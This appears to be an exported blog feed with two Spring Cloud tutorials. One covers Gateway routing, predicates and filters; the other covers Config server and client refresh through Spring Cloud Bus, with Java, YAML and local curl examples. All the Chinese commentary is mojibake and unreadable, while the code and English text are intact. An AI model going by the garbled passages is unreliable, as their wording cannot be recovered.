reactor.spring<br>cloud gatewayÊó®Âú®Êèê‰æõ‰∏Ä‰∏™ÁÆÄÂçïÊúâÊïàÁöÑË∑ØÁî±Âà∞apisÂπ∂‰∏îÊèê‰æõË∑®È¢ÜÂüüÁöÑÂÖ≥Ê≥®ÁÇπÂ¶ÇÔºöÂÆâÂÖ®ÔºåÊ£ÄÊµã„ÄÅÊåáÊ†áÂíåÂºπÊÄß„ÄÇ</p><h4 id="ÊúØËØ≠"><a href="#ÊúØËØ≠" class="headerlink" title="ÊúØËØ≠"></a>ÊúØËØ≠</h4><ul><li><p><strong>Route</strong> : The basic building block of the gateway. It is defined by an ID, a destination URI, a collection of predicates, and a collection of filters. A route is matched if the aggregate predicate is true.‚Äî-RouteÊòØgateway‰∏≠ÊúÄÂü∫Êú¨ÂùóÔºåÂ¶ÇÊûúÊâÄÊúâpredicateÊòØtrueÔºåÈÇ£‰πàroute‰ºöË¢´ÂåπÈÖç </p></li><li><p><strong>Predicate</strong> : This is a <a href="https://docs.oracle.com/javase/8/docs/api/java/util/function/Predicate.html" target="_blank" rel="noopener"> Java 8 Function Predicate </a> . The input type is a <a href="https://docs.spring.io/spring/docs/5.0.x/javadoc-api/org/springframework/web/server/ServerWebExchange.html" target="_blank" rel="noopener"> Spring Framework <code>ServerWebExchange</code> </a> . This lets you match on anything from the HTTP request, such as headers or parameters.ÈÄöËøájava8Êèê‰æõÁöÑPredicateÔºåÊàë‰ª¨ÂèØ‰ª•ÂåπÈÖçHttpRequest‰∏≠ÁöÑÔºåheadersÊàñËÄÖparameters </p></li><li><p><strong>Filter</strong> : These are instances of <a href="https://docs.spring.io/spring/docs/5.0.x/javadoc-api/org/springframework/web/server/GatewayFilter.html" target="_blank" rel="noopener"> Spring Framework <code>GatewayFilter</code> </a> that have been constructed with a specific factory. Here, you can modify requests and responses before or after sending the downstream request.Êàë‰ª¨ÂèØ‰ª•Âú®ÂèëÈÄÅÁªô‰∏ãÊ∏∏‰πãÂâç‰øÆÊîπËØ∑Ê±ÇÊàñËÄÖ‰πãÂêé‰øÆÊîπËøîÂõûÂõûÊù•ÁöÑÂìçÂ∫î„ÄÇËøôÈáåÔºåÊàë‰ª¨Áî®‰∏ãÈù¢‰∏ÄÂº†ÂõæÊù•Ëß£Èáä </p></li></ul><p><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373841.23215253444.png" alt="G52mV0.png"></p><p>‚Äã ‰ªéÂõæ‰∏≠ÔºåÊàë‰ª¨ÈúÄË¶ÅÊ≥®ÊÑèÂà∞Filter‰∏≠ÊòØÊîØÊåÅËØ∑Ê±ÇÂâçÔºåÂíåÂìçÂ∫îÂêéÁöÑÂ§ÑÁêÜÁöÑ</p><h4 id="Ë£ÖÈÖçspring-cloud-gateway"><a href="#Ë£ÖÈÖçspring-cloud-gateway" class="headerlink" title="Ë£ÖÈÖçspring cloud gateway"></a>Ë£ÖÈÖçspring cloud gateway</h4><p><strong>pom</strong></p><pre><code>&lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;        &lt;/dependency&gt;&lt;!--ÊöÇÊó∂ÂÖàÊ≥®Èáä &lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;        &lt;/dependency&gt;--&gt;&lt;!--spring cloud version :Hoxton.SR3--&gt;</code></pre><p><strong>application.yml</strong></p><pre><code>management:  endpoints:    web:      exposure:        include: &quot;*&quot;server:  port: 10000#spring: Ê≠§Â§ÑÊ≥®ÈáäÊîπ‰∏∫javaÊ≥®ÂÖ•#  cloud:#    gateway:#      routes:#        - id: first#          uri: http://localhost:9000#          predicates:#            - Path=/**logging:  level:    org.springframework.cloud.gateway: debug</code></pre><p><strong>javaÊ≥®ÂÖ•</strong></p><pre><code>@Beanpublic RouteLocator customerRouteLocator(RouteLocatorBuilder builder){  return builder.routes()            .route(r-&gt;r.path(&quot;/**&quot;)                  .uri(&quot;http://localhost:9000&quot;).id(&quot;first&quot;)            ).build();}</code></pre><p><strong>ÊµãËØï</strong></p><pre><code>D:\gitclonepackage\cloud&gt;curl http://localhost:10000/hello/huskyuihello, huskyui Mon Apr 13 17:25:28 CST 2020</code></pre><h4 id="‰ªãÁªçpredicate"><a href="#‰ªãÁªçpredicate" class="headerlink" title="‰ªãÁªçpredicate"></a>‰ªãÁªçpredicate</h4><pre><code>java8‰∏≠ÁöÑpredicate,Â∞±ÊòØfilterÈáåÈù¢ÁöÑÂáΩÊï∞„ÄÇËøôÊòØ‰∏Ä‰∏™ÊØîËæÉÁõ¥ËßÇÁöÑ‰æãÂ≠êList&lt;Integer&gt; list = new ArrayList&lt;&gt;(Arrays.asList(1,2,3,4,5,6,7,8,9));list.stream().filter(t-&gt;t&lt;5).forEach(System.out::println);ËæìÂá∫ 1,2,3,4</code></pre><h5 id="PathRoutePredicateFactory"><a href="#PathRoutePredicateFactory" class="headerlink" title="PathRoutePredicateFactory"></a>PathRoutePredicateFactory</h5><pre><code>@Beanpublic RouteLocator customerRouteLocator(RouteLocatorBuilder builder){    return builder.routes()        .route(r-&gt;r.path(&quot;/**&quot;)        .uri(&quot;http://localhost:9000&quot;).id(&quot;first&quot;)    ).build();}      ÊîæÂºÄ‰∫Ü/**,‰πüÂ∞±ÊòØÊîæÂºÄ‰∫ÜÊâÄÊúâhttp://localhost:9000ÊâÄÊúâË∑ØÂæÑD:\gitclonepackage\cloud&gt;curl http://localhost:10000/hello/huskyuihello, huskyui Mon Apr 13 17:25:28 CST 2020</code></pre><h5 id="CookieRoutePredicateFactory"><a href="#CookieRoutePredicateFactory" class="headerlink" title="CookieRoutePredicateFactory"></a>CookieRoutePredicateFactory</h5><pre><code>    @Bean    public RouteLocator customerRouteLocator(RouteLocatorBuilder builder){        return builder.routes()                .route(r-&gt;r                        .cookie(&quot;token&quot;,&quot;kee.e&quot;)                        .uri(&quot;http://localhost:9000&quot;).id(&quot;first&quot;)                ).build();    }D:\gitclonepackage\cloud&gt;curl http://localhost:10000/hello/huskyui{&quot;timestamp&quot;:&quot;2020-04-13T10:03:43.548+0000&quot;,&quot;path&quot;:&quot;/hello/huskyui&quot;,&quot;status&quot;:404,&quot;error&quot;:&quot;Not Found&quot;,&quot;message&quot;:null,&quot;requestId&quot;:&quot;b330030a-1&quot;}D:\gitclonepackage\cloud&gt;curl http://localhost:10000/hello/huskyui --cookie &quot;token=keexe&quot;hello, huskyui Mon Apr 13 18:03:55 CST 2020D:\gitclonepackage\cloud&gt;curl http://localhost:10000/hello/huskyui --cookie &quot;token=keeeee&quot;{&quot;timestamp&quot;:&quot;2020-04-13T10:09:09.207+0000&quot;,&quot;path&quot;:&quot;/hello/huskyui&quot;,&quot;status&quot;:404,&quot;error&quot;:&quot;Not Found&quot;,&quot;message&quot;:null,&quot;requestId&quot;:&quot;23aba850-3&quot;}</code></pre><h5 id="ÁªÑÂêà‰ΩøÁî®"><a href="#ÁªÑÂêà‰ΩøÁî®" class="headerlink" title="ÁªÑÂêà‰ΩøÁî®"></a>ÁªÑÂêà‰ΩøÁî®</h5><pre><code>    @Bean    public RouteLocator customerRouteLocator(RouteLocatorBuilder builder){        return builder.routes()                .route(r-&gt;r                        .method(HttpMethod.POST)                        .and()                        .path(&quot;/**&quot;)                        .and()                        .cookie(&quot;token&quot;,&quot;kee.e&quot;)                        .uri(&quot;http://localhost:9000&quot;).id(&quot;first&quot;)                ).build();    }D:\gitclonepackage\cloud&gt;curl -X POST  http://localhost:10000/hello/huskyui --cookie &quot;token=keeie&quot;hello, huskyui Mon Apr 13 18:13:54 CST 2020</code></pre><h6 id="Ëá™ÂÆö‰πâPredicate"><a href="#Ëá™ÂÆö‰πâPredicate" class="headerlink" title="Ëá™ÂÆö‰πâPredicate"></a>Ëá™ÂÆö‰πâPredicate</h6><pre><code>// Êàë‰ª¨ÂÖàÂéªÁúã‰∏Ä‰∏ãcookieÂà§Êñ≠ÁöÑÊ∫êÁ†Å  CookieRoutePredicateFactory.java    @Override    public Predicate&lt;ServerWebExchange&gt; apply(Config config) {        return new GatewayPredicate() {            @Override            public boolean test(ServerWebExchange exchange) {                List&lt;HttpCookie&gt; cookies = exchange.getRequest().getCookies()                        .get(config.name);                if (cookies == null) {                    return false;                }                for (HttpCookie cookie : cookies) {                    if (cookie.getValue().matches(config.regexp)) {                        return true;                    }                }                return false;            }            @Override            public String toString() {                return String.format(&quot;Cookie: name=%s regexp=%s&quot;, config.name,                        config.regexp);            }        };    }// ÂæàÂ•ΩÁêÜËß£ÁöÑ‰ª£Á†ÅÔºåÊàë‰ª¨ÂÜô‰∏Ä‰∏≤headerÂà§Êñ≠ÁöÑ @Bean    public RouteLocator customerRouteLocator(RouteLocatorBuilder builder) {        return builder.routes()                .route(r -&gt; r.predicate(t -&gt; {                            List&lt;String&gt; values= t.getRequest().getHeaders().get(&quot;token&quot;);                            if(values==null || values.isEmpty()){                                return false;                            }                            return values.stream().anyMatch(value-&gt;value.equals(&quot;123456&quot;));                        })                                .uri(&quot;lb://eureka-consumer&quot;).id(&quot;first&quot;)                ).build();    } D:\gitclonepackage\cloud&gt;curl -X POST http://localhost:10000/hello/huskyui --header &quot;token: 123456&quot;hello, huskyui Thu Apr 16 14:58:20 CST 2020</code></pre><h4 id="‰ªãÁªçfilter"><a href="#‰ªãÁªçfilter" class="headerlink" title="‰ªãÁªçfilter"></a>‰ªãÁªçfilter</h4><p>Route filters allow the modification of the incoming HTTP request or outgoing<br>HTTP response in some manner. Route filters are scoped to a particular route.<br>Spring Cloud Gateway includes many built-in GatewayFilter Factories.</p><p>Ë∑ØÁî±ËøáÊª§Âô®ÂèØ‰ª•‰øÆÊîπHTTPËØ∑Ê±ÇÂíåHTTPÂìçÂ∫îÔºåË∑ØÁî±ËøáÊª§Âô®ÁöÑ‰ΩúÁî®ÂüüÊòØÁâπÂÆöÁöÑË∑ØÁî±„ÄÇspring cloud gatewayÊúâÂæàÂ§öÂÜÖÁΩÆÁöÑÁΩëÂÖ≥ËøáÊª§Âô®ÁöÑÂ∑•ÂéÇ„ÄÇ</p><h5 id="‰ΩøÁî®PathRoutePredicateFactoryÂíåStripPrefixGatewayFilterFactoryÂÆûÁé∞ÂØπÁâπÂÆöÈ°πÁõÆËÆøÈóÆ"><a href="#‰ΩøÁî®PathRoutePredicateFactoryÂíåStripPrefixGatewayFilterFactoryÂÆûÁé∞ÂØπÁâπÂÆöÈ°πÁõÆËÆøÈóÆ" class="headerlink" title="‰ΩøÁî®PathRoutePredicateFactoryÂíåStripPrefixGatewayFilterFactoryÂÆûÁé∞ÂØπÁâπÂÆöÈ°πÁõÆËÆøÈóÆ"></a>‰ΩøÁî®PathRoutePredicateFactoryÂíåStripPrefixGatewayFilterFactoryÂÆûÁé∞ÂØπÁâπÂÆöÈ°πÁõÆËÆøÈóÆ</h5><pre><code>    @Bean    public RouteLocator customerRouteLocator(RouteLocatorBuilder builder) {        return builder.routes()                .route(r -&gt; r.path(&quot;/consumer/**&quot;)                        .filters(f-&gt;f.stripPrefix(1))                                .uri(&quot;lb://eureka-consumer&quot;).id(&quot;first&quot;)                ).build();    }D:\gitclonepackage\cloud&gt;curl -X POST http://localhost:10000/consumer/hello/huskyuihello, huskyui Thu Apr 16 15:16:31 CST 2020// Âú®ËÆøÈóÆÁöÑÊó∂ÂÄôÔºåÁî±‰∫éstripPrefixÊòØ1Ôºå‰ºöÂéªÈô§/consumerËøô‰∏ÄÂ±ÇÔºåÁúüÊ≠£ÁöÑ‰ºöËΩ¨ÂèëÊàê    // lb://eureka-consumer/hello/huskyui</code></pre><h5 id="‰øÆÊîπRequestBody‰∏≠‰ø°ÊÅØ"><a href="#‰øÆÊîπRequestBody‰∏≠‰ø°ÊÅØ" class="headerlink" title="‰øÆÊîπRequestBody‰∏≠‰ø°ÊÅØ"></a>‰øÆÊîπRequestBody‰∏≠‰ø°ÊÅØ</h5><pre><code>        @Bean    public RouteLocator customerRouteLocator(RouteLocatorBuilder builder) {        return builder.routes()                .route(r -&gt; r.path(&quot;/producer/**&quot;)                        .filters(f -&gt; f.stripPrefix(1)                                .modifyRequestBody(Map.class, Map.class, MediaType.APPLICATION_JSON_VALUE, (serverWebExchange, s) -&gt; {                                    System.out.println(s);                                    s.put(&quot;name&quot;,&quot;adios&quot;);                                    return Mono.just(s);                                }))                        .uri(&quot;lb://eureka-producer&quot;).id(&quot;first&quot;)                ).build();    }// ÂèØ‰ª•ÁúãÂà∞Ëøô‰∏™sÁöÑÁ±ªÂûãÊòØMap.class,Êàë‰øÆÊîπÁöÑÂØπÂ∫înameÁöÑÂÄºÔºåPOST http://localhost:10000/producer/helloContent-Type: application/json{&quot;name&quot;: &quot;huskyui&quot;}hello, adios Thu Apr 16 18:34:56 CST 2020// ÂèØ‰ª•ÁúãÂà∞Êàë‰øÆÊîπÂØπÂ∫îÁöÑrequestBodyÁöÑÂÄºÔºåÂú®ÊéßÂà∂Âè∞‰πüÊâìÂç∞‰∫ÜÂàùÂßãRequestBodyËØ∑Ê±ÇjsonÔºà‰∏äÈù¢ËØ∑Ê±ÇÊñπÂºèÊòØÈÄöËøáideaÈáåÈù¢ÂÜÖÁΩÆÁöÑËØ∑Ê±ÇÊñπÂºèÔºâ</code></pre><h4 id="ÂÖ®Â±ÄÊã¶Êà™Âô®"><a href="#ÂÖ®Â±ÄÊã¶Êà™Âô®" class="headerlink" title="ÂÖ®Â±ÄÊã¶Êà™Âô®"></a>ÂÖ®Â±ÄÊã¶Êà™Âô®</h4><p>The <code>GlobalFilter</code> interface has the same signature as <code>GatewayFilter</code> .<br>These are special filters that are conditionally applied to all routes.</p><p>GlobalFilterÊé•Âè£ÂÖ∑Êúâ‰∏égatewayFilterÁõ∏ÂêåÁöÑÁ≠æÂêçÔºåËøô‰∫õÊòØÁâπÊÆäËøáÊª§Âô®ÔºåÊúâÊù°‰ª∂Âú∞Â∫îÁî®‰∫éÊâÄÊúâË∑ØÁî±„ÄÇ</p><h4 id="ÂêéÁª≠"><a href="#ÂêéÁª≠" class="headerlink" title="ÂêéÁª≠"></a>ÂêéÁª≠</h4><p>‰ªéÁé∞Âú®ÂºÄÂßãÔºåÊöÇÂÅúÊõ¥Êñ∞spring cloud gatewayÁõ∏ÂÖ≥ÂçöÂÆ¢ÔºåÊàëÂÖàÂéªÂ≠¶ÁÇπÂà´ÁöÑ‰∫Ü„ÄÇÂ≠¶‰π†ËøôÁßçÂπ∂Ê≤°Êúâ‰ªÄ‰πàÁî®„ÄÇ</p><h4 id="ÂèÇËÄÉ"><a href="#ÂèÇËÄÉ" class="headerlink" title="ÂèÇËÄÉ"></a>ÂèÇËÄÉ</h4><p><a href="http://www.ityouknow.com/spring-cloud.html" target="_blank" rel="noopener"> Á∫ØÊ¥ÅÁöÑÂæÆÁ¨ëÂÜôÁöÑspring cloudÊñáÊ°£ </a></p><p><a href="https://windmt.com/tags/API-Gateway/" target="_blank" rel="noopener"> windmtÂÜôÁöÑÊñáÊ°£ </a></p><p>[ spring cloud gatewayÂÆòÊñπÊñáÊ°£ ](<a href="https://cloud.spring.io/spring-cloud-" target="_blank" rel="noopener">https://cloud.spring.io/spring-cloud-</a><br>static/spring-cloud-gateway/2.2.2.RELEASE/reference/html/#gateway-starter)</p><p>[ github‰∏äspring cloud gatewayÊèê‰æõÁöÑsamples ](<a href="https://github.com/spring-" target="_blank" rel="noopener">https://github.com/spring-</a><br>cloud/spring-cloud-gateway/tree/master/spring-cloud-gateway-<br>sample/src/main/java/org/springframework/cloud/gateway/sample)</p>]]></content>
      
      
      
        <tags>
            
            <tag> spring </tag>
            
            <tag> spring cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringCloud-config</title>
      <link href="/2020/03/30/SpringCloud-config/"/>
      <url>/2020/03/30/SpringCloud-config/</url>
      
        <content type="html"><![CDATA[<h3 id="Spring-Cloud-Config"><a href="#Spring-Cloud-Config" class="headerlink" title="Spring Cloud Config"></a>Spring Cloud Config</h3><h4 id="ÁÆÄ‰ªã"><a href="#ÁÆÄ‰ªã" class="headerlink" title="ÁÆÄ‰ªã"></a>ÁÆÄ‰ªã</h4><p>Spring Cloud Config provides server-side and client-side support for<br>externalized configuration in a distributed system. With the Config Server,<br>you have a central place to manage external properties for applications across<br>all environments. The concepts on both client and server map identically to<br>the Spring <code>Environment</code> and <code>PropertySource</code> abstractions, so they fit<br>very well with Spring applications but can be used with any application<br>running in any language. As an application moves through the deployment<br>pipeline from dev to test and into production, you can manage the<br>configuration between those environments and be certain that applications have<br>everything they need to run when they migrate. The default implementation of<br>the server storage backend uses git, so it easily supports labelled versions<br>of configuration environments as well as being accessible to a wide range of<br>tooling for managing the content. It is easy to add alternative<br>implementations and plug them in with Spring configuration.</p><p>Spring Cloud Config‰∏∫ÂàÜÂ∏ÉÂºèÁ≥ªÁªü‰∏≠ÁöÑÂ§ñÈÉ®ÂåñÈÖçÁΩÆÊèê‰æõ‰∫ÜÊúçÂä°Âô®Á´ØÂíåÂÆ¢Êà∑Á´ØÊîØÊåÅ„ÄÇÊúâ‰∫ÜConfig<br>ServerÔºåÊÇ®Â∞±Êúâ‰∫Ü‰∏Ä‰∏™‰∏≠ÂøÉ‰ΩçÁΩÆÊù•ÁÆ°ÁêÜË∑®ÊâÄÊúâÁéØÂ¢ÉÁöÑÂ∫îÁî®Á®ãÂ∫èÁöÑÂ§ñÈÉ®Â±ûÊÄß„ÄÇÂÆ¢Êà∑Êú∫ÂíåÊúçÂä°Âô®‰∏äÁöÑÊ¶ÇÂøµ‰∏éSpringÁéØÂ¢ÉÂíåPropertySourceÊäΩË±°ÂÆåÂÖ®Áõ∏ÂêåÔºåÂõ†Ê≠§ÂÆÉ‰ª¨ÈùûÂ∏∏ÈÄÇÂêàSpringÂ∫îÁî®Á®ãÂ∫èÔºå‰ΩÜÂèØ‰ª•Áî®‰∫é‰ª•‰ªª‰ΩïËØ≠Ë®ÄËøêË°åÁöÑ‰ªª‰ΩïÂ∫îÁî®Á®ãÂ∫è.ÂΩìÂ∫îÁî®Á®ãÂ∫èÈÄöËøáÈÉ®ÁΩ≤ÁÆ°ÈÅì‰ªédevËΩ¨ÁßªÂà∞ÊµãËØïÂπ∂ËøõÂÖ•Áîü‰∫ßÁéØÂ¢ÉÊó∂ÔºåÊÇ®ÂèØ‰ª•Âú®‰∏§ËÄÖ‰πãÈó¥ÁÆ°ÁêÜÈÖçÁΩÆ.ÊúçÂä°Âô®Â≠òÂÇ®ÂêéÁ´ØÈªòËÆ§ÁöÑÂÆûÁé∞‰ΩøÁî®gitÔºåÂõ†Ê≠§ÂÆÉÂæàÂÆπÊòìÊîØÊåÅÈÖçÁΩÆÁéØÂ¢ÉÁöÑÊ†áËÆ∞ÁâàÊú¨ÔºåÂπ∂‰∏îÂèØ‰ª•ËÆøÈóÆÂêÑÁßçÂêÑÊ†∑ÁöÑÂ∑•ÂÖ∑Êù•ÁÆ°ÁêÜÂÜÖÂÆπ„ÄÇÂæàÂÆπÊòìÊ∑ªÂä†Êõø‰ª£ÂÆûÁé∞Âπ∂Â∞ÜÂÆÉ‰ª¨ÊèíÂÖ•SpringÈÖçÁΩÆ‰∏≠</p><h4 id="config-server"><a href="#config-server" class="headerlink" title="config-server"></a>config-server</h4><p><strong>ÂàõÂª∫‰∏Ä‰∏™ÈÖçÁΩÆ‰ªìÂ∫ì</strong></p><p>ÂÖ∑‰ΩìÊ†∑ÂºèÔºåÂèØ‰ª•Áúã<a href="https://github.com/huskyui/config-repo" target="_blank" rel="noopener">https://github.com/huskyui/config-repo</a></p><p>Âú® <code>spring-cloud</code> ‰∏ãÈù¢Êúâ‰∏â‰∏™Êñá‰ª∂Ôºå <code>config-dev.yml</code> Âíå <code>config-prod.yml</code> Âíå <code>config-test.yml</code></p><p><strong>ÂØºÂÖ•pom</strong></p><pre><code>&lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;        &lt;/dependency&gt;&lt;!--spring-cloud.version Hoxton.SR3 --&gt;</code></pre><p><strong>application.yml</strong></p><pre><code>spring:  application:    name: config-server  cloud:    config:      server:        git:          uri: https://github.com/huskyui/config-repo # uri          search-paths: spring-cloud # Â±ÇÁ∫ßserver:  port: 12000eureka:  client:    service-url:      defaultZone: http://localhost:7000/eureka/# ‰ªäÂ§©ÂÜôdefalutZoneÂÜôÈîô‰∫ÜÔºåÂèëÁé∞Â∫îÁî®Âú®ËØ∑Ê±Çloclahost:8761/eureka/,ÂéüÊù•ÈªòËÆ§ÂÄºÊòØËøô‰∏™</code></pre><p><strong>@EnableConfigServer</strong></p><pre><code>@SpringBootApplication@EnableConfigServer// ÂºÄÂêØconfig-serverpublic class CloudConfigServerApplication {    public static void main(String[] args) {        SpringApplication.run(CloudConfigServerApplication.class, args);    }}</code></pre><p><strong>ÊµãËØï</strong></p><pre><code>curl http://localhost:12000/config-dev.ymlcurrency:  name: huskyui-update-2020-03-24-----2</code></pre><h4 id="config-client"><a href="#config-client" class="headerlink" title="config-client"></a>config-client</h4><p><strong>pom</strong></p><pre><code>&lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;        &lt;/dependency&gt;&lt;!--spring-cloud-version Hoxton.SR3--&gt;</code></pre><p><strong>bootstrap.yml</strong></p><p>bootstrap.yml‰ºòÂÖà‰∫éapplication.ymlÈÖçÁΩÆ</p><pre><code>spring:  cloud:    config:      label: master # Áî®‰∫éÊãâÂèñËøúÁ®ãÈÖçÁΩÆÂ±ûÊÄßÁöÑÊ†áÁ≠æÂêçÁß∞ÔºåÂú®Âü∫‰∫égitÁöÑÊúçÂä°Âô®ÔºåÈÄöÂ∏∏ÊòØmaster      name: config # Name of application used to fetch remote properties. ÂØπÂ∫îconfig-dev.yml‰∏≠ÁöÑconfig      profile: dev # The default profile to use when fetching remote configuration      discovery:        enabled: true #Flag to indicate that config server discovery is enabled        service-id: config-server #Service id to locate config server.‰πüÂ∞±ÊòØconfig-serverÊ≥®ÂÜåÂú®eureka‰∏≠ÁöÑapplication-nameeureka:  client:    service-url:      defaultZone: http://localhost:7000/eureka/</code></pre><p><strong>application.yml</strong></p><pre><code>spring:  application:    name: config-git server:  port: 13000management:  endpoints:    web:      exposure:        include: refresh # ÊîæÂºÄ/actuator/refreshË∑ØÂæÑÔºåÂÖ∑‰ΩìÊòØ‰ªÄ‰πàÊ†∑ÂºèÁöÑËØ∑Ê±ÇÔºåËøòÂæóÁúãÊñáÊ°£</code></pre><p><strong>HelloController</strong></p><pre><code>@RestController/** * Convenience annotation to put a &lt;code&gt;@Bean&lt;/code&gt; definition in * {@link org.springframework.cloud.context.scope.refresh.RefreshScope refresh scope}. * Beans annotated this way can be refreshed at runtime and any components that are using * them will get a new instance on the next method call, fully initialized and injected * with all dependencies.   Âú®Ë∞ÉÁî®/actuator/refreshÊó∂ÔºåËøêË°åÊúüÈó¥ÔºåËøô‰∏™bean‰ºöË¢´Âà∑Êñ∞*/@RefreshScopepublic class HelloController {    @Value(&quot;${currency.name:error}&quot;)    private String name;    @RequestMapping(&quot;/hello&quot;)    public String name(){        return name;    }}</code></pre><p><strong>ÊµãËØï</strong></p><pre><code>1.ÊµãËØïÂçï‰∏™Â∫îÁî®Âà∑Êñ∞ÊâìÂåÖËøêË°åÊµãËØïÂΩìÂâçÊï∞ÊçÆÈóÆÈ¢òcurl localhost:13000/hellohuskyui-update-2020-03-24-----2Êõ¥Êñ∞Êï∞ÊçÆÊõ¥Êñ∞Êï∞ÊçÆconfig-devÈáåÈù¢ÁöÑÊï∞ÊçÆcurrency:  name: huskyui-update-2020-03-27 Âπ∂Êèê‰∫§Âà∞ËøúÁ®ã‰ªìÂ∫ìË∞ÉÁî®Âà∑Êñ∞Êé•Âè£curl -X POST localhost:13000/actuator/refresh[&quot;currency.name&quot;,&quot;config.client.version&quot;]curl localhost:13000/hellohuskyui-update-2020-03-27ÂèØ‰ª•ÁúãÂà∞Êï∞ÊçÆÂà∑Êñ∞ÊàêÂäü2.ÊµãËØïÂ§ö‰∏™Â∫îÁî®Âà∑Êñ∞java -jar xxx.jar --server.port=13000java -jar xxx.jar --server.port=13001curl localhost:13000/hellohuskyui-update-2020-03-27curl localhost:13001/hellohuskyui-update-2020-03-27Êõ¥Êñ∞Êï∞ÊçÆconfig-dev.ymlcurrency:  name: huskyui-update-2020-03-27-for-two-client-test2Âπ∂Êèê‰∫§Âà∞ËøúÁ®ã‰ªìÂ∫ìcurl localhost:13000/hellohuskyui-update-2020-03-27curl localhost:13001/hellohuskyui-update-2020-03-27‰∏ãÈù¢ÊâßË°åÂà∑Êñ∞Êìç‰Ωúcurl -X POST localhost:13000/actuator/refresh[&quot;currency.name&quot;,&quot;config.client.version&quot;]curl localhost:12000/config-dev.ymlcurrency:  name: huskyui-update-2020-03-27-for-two-client-test2curl localhost:13000/hellohuskyui-update-2020-03-27-for-two-client-test2curl localhost:13001/hellohuskyui-update-2020-03-27curl -X POST localhost:13001/actuator/refresh[&quot;currency.name&quot;,&quot;config.client.version&quot;]curl -X POST localhost:13001/hellohuskyui-update-2020-03-27-for-two-client-test2ÂèØ‰ª•ÁúãÂà∞ÔºåÂ¶ÇÊûúÈÖçÁΩÆÊñá‰ª∂Êõ¥Êñ∞Êó∂Ôºå/actuator/refreshÂè™ÊòØÈíàÂØπÂçï‰∏™Â∫îÁî®ÁöÑÔºåÂ¶ÇÊûúÈúÄË¶ÅÊõ¥Êñ∞ÊâÄÊúâÂ∫îÁî®ÈúÄË¶ÅÂàÜÂà´ÊòØÂéªÂà∑Êñ∞ÂØπÂ∫îÁöÑÂ∫îÁî®</code></pre><h4 id="‰ΩøÁî®spring-cloud-busÂÆûÁé∞Áæ§‰ΩìÂà∑Êñ∞"><a href="#‰ΩøÁî®spring-cloud-busÂÆûÁé∞Áæ§‰ΩìÂà∑Êñ∞" class="headerlink" title="‰ΩøÁî®spring-cloud-busÂÆûÁé∞Áæ§‰ΩìÂà∑Êñ∞"></a>‰ΩøÁî®spring-cloud-busÂÆûÁé∞Áæ§‰ΩìÂà∑Êñ∞</h4><p><a href="https://imgchr.com/i/GmFm2n" target="_blank" rel="noopener"> [Â§ñÈìæÂõæÁâáËΩ¨Â≠òÂ§±Ë¥•,Ê∫êÁ´ôÂèØËÉΩÊúâÈò≤ÁõóÈìæÊú∫Âà∂,Âª∫ËÆÆÂ∞ÜÂõæÁâá‰øùÂ≠ò‰∏ãÊù•Áõ¥Êé•‰∏ä‰º†(img-<br>jeIW5krD-1585555116625)(https://s1.ax1x.com/2020/03/30/GmFm2n.jpg)]</a></p><p>‰ªé‰∏äÈù¢ÁöÑÊû∂ÊûÑÂõæÔºåÊàë‰ª¨ <code>config-server</code> Âíå <code>config-client</code> ÈÉΩËÆ¢ÈòÖ‰∏Ä‰∏ãRabbitMQ</p><p>Êàë‰ª¨ÈúÄË¶Å‰øÆÊîπÂéüÊù•ÁöÑ <code>config-server</code></p><p><strong>POM</strong></p><pre><code>&lt;dependency&gt;    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;    &lt;artifactId&gt;spring-cloud-bus&lt;/artifactId&gt;&lt;/dependency&gt;        &lt;dependency&gt;    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;    &lt;artifactId&gt;spring-cloud-stream-binder-rabbit&lt;/artifactId&gt;&lt;/dependency&gt;        &lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;</code></pre><p><strong>application.ymlÊ∑ªÂä†</strong></p><pre><code>spring:  rabbitmq:    host: localhost    port: 5672    username: guest    password: guest  ## ‰∏äËø∞ÊòØRabbitMQÁõ∏ÂÖ≥ËøûÊé•ÂèÇÊï∞ÔºåÊºè‰∫Ü‰∏Ä‰∏™vhostmanagement:  endpoints:    web:      exposure:        include: &quot;*&quot; ## ÊîæÂºÄ/actuator/bus-refresh</code></pre><p><code>config-client</code> ‰øÆÊîπÈÉ®ÂàÜ‰πüÂíå‰∏äËø∞‰∏ÄÊ†∑</p><p>‰øÆÊîπÂêéÔºåÂêØÂä®config-server,Âπ∂ÂêØÂä®‰∏§Âè∞config-client,Á´ØÂè£‰∏çÂêåÔºà‚Äìserver.port=different_portÔºâ</p><p>Êàë‰ª¨ËÆøÈóÆ <code>http://localhost:15672/</code> ËÆøÈóÆRabbitMQÂÆ¢Êà∑Á´ØÔºåÁÇπÂáªexchange,ÂèØ‰ª•ÁúãÂà∞ÊòØ</p><p><code>springCloudBus</code> 